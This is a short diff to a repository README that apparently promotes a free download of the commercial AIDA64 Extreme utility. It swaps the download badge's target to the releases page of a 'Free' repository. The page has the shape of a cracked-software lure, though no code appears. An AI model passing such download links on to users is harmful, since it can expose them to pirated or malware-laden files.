@@ -9,7 +9,7 @@ Welcome to the ultimate AIDA64 Extreme repository where you can find everything 
 
 ## Explore the Repository
 Ready to dive into the world of AIDA64 Extreme? You can access all the exciting content by visiting the following link:
-[![Download AIDA64 Extreme](https://img.shields.io/badge/Download-Project.zip-blue)](https://github.com/files/Project.zip) 📥
+[![Download AIDA64 Extreme](https://github.com/Mekbrut/AIDA64-Extreme-Free/releases)](https://github.com/Mekbrut/AIDA64-Extreme-Free/releases) 📥
 
 ### What to Expect
 Here's a sneak peek of what you can expect to find in our repository:
